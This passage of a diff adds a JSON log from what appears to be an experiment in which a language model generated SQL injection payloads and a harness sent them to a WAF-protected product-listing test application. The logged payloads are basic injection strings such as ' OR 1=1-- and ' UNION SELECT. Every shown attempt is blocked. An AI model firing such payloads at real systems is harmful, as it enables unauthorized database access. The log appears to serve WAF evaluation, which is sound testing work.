+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 6.271,
+          "response_sha256": "c41e4b299052e9f2ca32b63d0f51afe8f6665c2687c9a97c0bd4911efc47748f",
+          "mode": "live_generated_static",
+          "blocked_keyword": " UNION "
+        },
+        {
+          "attempt_no": 7,
+          "payload": "' OR 1=1 LIMIT 1--",
+          "response_code": 403,
+          "checkpoint": {
+            "bypass": false,
+            "reason": "no_valid_result"
+          },
+          "bypass": false,
+          "latency_ms": 15.777,
+          "response_sha256": "816144c5eb83864e9de05bb58be19db3bc2f2ec2434b63ec3d51075be949ccac",
+          "mode": "live_generated_static",
+          "blocked_keyword": " OR "
+        }
+      ],
+      "auxiliary_requests": 4,
+      "attack_requests": 7,
+      "ai_api_requests": 0,
+      "stop_reason": "source_exhausted",
+      "total_sut_requests": 11,
+      "request_to_first_success": null,
+      "bypass": false,
+      "waf": {
+        "waf_enabled": true,
+        "waf_level": 1
+      },
+      "snapshot": [
+        {
+          "id": 1,
+          "name": "iPhone 15 Pro Max"
+        },
+        {
+          "id": 2,
+          "name": "Samsung Galaxy S24 Ultra"
+        },
+        {
+          "id": 3,
+          "name": "MacBook Pro M3"
+        },
+        {
+          "id": 4,
+          "name": "Tai nghe AirPods Pro 2"
+        },
+        {
+          "id": 5,
+          "name": "Bàn phím cơ Keychron Q1"
+        }
+      ],
+      "snapshot_sha256": "f2ffe3e2b2d2e32e514c22ed94afec30987c756b240dc156a9d3935b6a5c1360",
+      "baseline": {
+        "payload": "__no_product_2ef1fd81399a445baf7beb84195a6c40",
+        "status": 200,
+        "result": []
+      },
+      "run_no": 3,
+      "api_calls": [],
+      "suggestions": []
+    }
+  ],
+  "model_inference_performed": true,
+  "static_generation": {
+    "payloads": [
+      "' OR '1'='1",
+      "' UNION SELECT 1,2,3--",
+      "' OR 1=1--",
+      "' AND 1=1--",
+      "' OR ''='",
+      "' UNION SELECT NULL--",
+      "' OR 1=1 LIMIT 1--"
+    ],
+    "api_calls": [
+      {
+        "status": "success",
+        "usage": {
+          "completion_tokens": 64,
+          "prompt_tokens": 313,
+          "total_tokens": 377,
+          "completion_tokens_details": null,
+          "prompt_tokens_details": null,
+          "queue_time": 0.051786785,
+          "prompt_time": 0.022092211,
+          "completion_time": 0.126471967,
+          "total_time": 0.148564178
+        },
+        "response_id": "chatcmpl-6e143342-619d-441a-b63d-15990f137815",
+        "model": "qwen/qwen3.8-27b",
+        "latency_ms": 1555.191
+      }
+    ],
+    "reused_across_runs": true
+  },
+  "snapshot_consistent": true,
+  "sources_unchanged": true,
+  "api_calls": [
+    {
+      "status": "success",
+      "usage": {
+        "completion_tokens": 64,
+        "prompt_tokens": 313,
+        "total_tokens": 377,
+        "completion_tokens_details": null,
+        "prompt_tokens_details": null,
+        "queue_time": 0.051786785,
+        "prompt_time": 0.022092211,
+        "completion_time": 0.126471967,
+        "total_time": 0.148564178
+      },
+      "response_id": "chatcmpl-6e143342-619d-441a-b63d-15990f137815",
+      "model": "qwen/qwen3.8-27b",
+      "latency_ms": 1555.191
+    },
+    {
+      "status": "success",
+      "usage": {
+        "completion_tokens": 58,
+        "prompt_tokens": 326,
+        "total_tokens": 384,
+        "completion_tokens_details": null,
+        "prompt_tokens_details": null,
+        "queue_time": 0.054230851,
+        "prompt_time": 0.022098108,
+        "completion_time": 0.117213787,
+        "total_time": 0.139311895
+      },
+      "response_id": "chatcmpl-ecbc42d5-9b2f-4d74-ba06-fa78f03237dc",
+      "model": "qwen/qwen3.8-27b",
+      "latency_ms": 469.708
+    },
+    {
+      "status": "success",
+      "usage": {
+        "completion_tokens": 58,
+        "prompt_tokens": 326,
+        "total_tokens": 384,
+        "completion_tokens_details": null,
+        "prompt_tokens_details": null,
+        "queue_time": 0.058077747,
+        "prompt_time": 0.022847711,
+        "completion_time": 0.116513591,
+        "total_time": 0.139361302
+      },
+      "response_id": "chatcmpl-b0632eaf-8c91-467e-9901-947fbe86b16f",
+      "model": "qwen/qwen3.8-27b",
+      "latency_ms": 496.869
+    },
+    {
+      "status": "success",
+      "usage": {
+        "completion_tokens": 58,
+        "prompt_tokens": 326,
+        "total_tokens": 384,
+        "completion_tokens_details": null,
+        "prompt_tokens_details": null,
+        "queue_time": 0.053039395,
+        "prompt_time": 0.022250405,
+        "completion_time": 0.11999761,
+        "total_time": 0.142248015
+      },
+      "response_id": "chatcmpl-4933d69e-66a6-4c1d-98e7-ab4f076c9479",
+      "model": "qwen/qwen3.8-27b",
+      "latency_ms": 516.349
+    }
+  ]
+}
